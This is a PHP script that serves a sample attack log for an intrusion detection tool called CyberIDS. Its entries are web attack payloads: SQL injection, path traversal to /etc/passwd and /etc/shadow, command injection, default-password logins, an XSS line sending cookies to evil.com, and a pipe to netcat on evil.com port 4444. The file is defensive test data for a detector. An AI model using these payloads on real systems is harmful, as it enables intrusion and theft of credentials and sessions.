<?php
// ============================================================
//  sample_log.php — Download a sample attack log file
// ============================================================
header('Content-Type: text/plain');
header('Content-Disposition: attachment; filename="sample_attack.log"');

$sample = <<<LOG
# CyberIDS Sample Attack Log File
# Format: IP_ADDRESS METHOD URL STATUS_CODE DATE
# -----------------------------------------------

185.220.101.45 GET /search?q=' OR '1'='1-- 200 2024-01-15T10:22:31
10.0.0.55 POST /login.php?user=admin&pass='; DROP TABLE users-- 403 2024-01-15T10:23:01
203.0.113.77 GET /download?file=../../../../etc/passwd 404 2024-01-15T10:23:45
172.16.5.22 GET /page?comment=<script>document.location='http://evil.com?c='+document.cookie</script> 200 2024-01-15T10:24:10
91.108.4.18 POST /api?exec=; ls -la /etc 500 2024-01-15T10:25:00
185.220.101.45 GET /products?id=1 UNION SELECT username,password,3 FROM users-- 200 2024-01-15T10:25:30
45.33.32.156 GET /wp-login.php?log=admin&pwd=password 401 2024-01-15T10:26:00
198.51.100.42 GET /profile?bio=javascript:alert(document.domain) 200 2024-01-15T10:26:30
185.220.101.45 GET /run?code=eval(base64_decode('cGhwaW5mbygpOw==')) 200 2024-01-15T10:27:00
192.168.1.100 GET /products?color=blue&size=10 200 2024-01-15T10:28:00
5.188.206.26 GET /static/../../../etc/shadow 403 2024-01-15T10:29:00
144.76.86.12 GET /search?q=<img src=x onerror=alert(1)> 200 2024-01-15T10:30:00
178.62.56.3 POST /admin/login?user=root&pass=toor 401 2024-01-15T10:31:00
195.54.160.149 GET /phpmyadmin/index.php 403 2024-01-15T10:32:00
185.220.101.45 GET /api/data?id=1 AND SLEEP(5)-- 200 2024-01-15T10:33:00
91.108.4.18 GET /cmd?exec=`whoami` 500 2024-01-15T10:34:00
91.108.4.18 GET /cmd?run=cat /etc/passwd 500 2024-01-15T10:35:00
91.108.4.18 POST /run?x=| nc evil.com 4444 500 2024-01-15T10:36:00
45.33.32.156 GET /wp-admin/wp-login.php 401 2024-01-15T10:37:00
45.33.32.156 POST /admin/login?user=administrator&pass=Admin123 401 2024-01-15T10:38:00
45.33.32.156 POST /admin/login?user=sa&pass=sa 401 2024-01-15T10:39:00
LOG;

echo $sample;
